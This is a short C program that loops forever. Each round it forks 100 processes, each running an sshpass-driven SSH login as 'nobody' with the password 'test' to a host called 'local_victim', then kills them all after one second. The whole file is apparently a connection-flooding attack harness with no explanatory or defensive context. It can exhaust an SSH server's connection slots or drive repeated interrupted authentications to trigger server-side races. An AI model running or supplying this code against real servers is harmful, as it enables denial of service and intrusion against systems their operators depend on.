#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <unistd.h>

#define SIMULTANEOUS_PROCESSES 100

pid_t spawn_child() {
  pid_t pid;
  pid = fork();
  if (pid == 0) {
    printf("Spawned pid %d\n", getpid());
    system("sshpass -p 'test' -- ssh -T -o NumberOfPasswordPrompts=1 "
           "nobody@local_victim");
    exit(0);
  } else {
    return pid;
  }
}

int main() {
  pid_t children[SIMULTANEOUS_PROCESSES] = {0};
  while (1) {
    for (int i = 0; i < SIMULTANEOUS_PROCESSES; ++i) {
      children[i] = spawn_child();
    }
    sleep(1);
    for (int i = 0; i < SIMULTANEOUS_PROCESSES; ++i) {
      kill(children[i], SIGKILL);
    }
    for (int i = 0; i < SIMULTANEOUS_PROCESSES; ++i) {
      waitpid(children[i], NULL, 0);
    }
  }
}
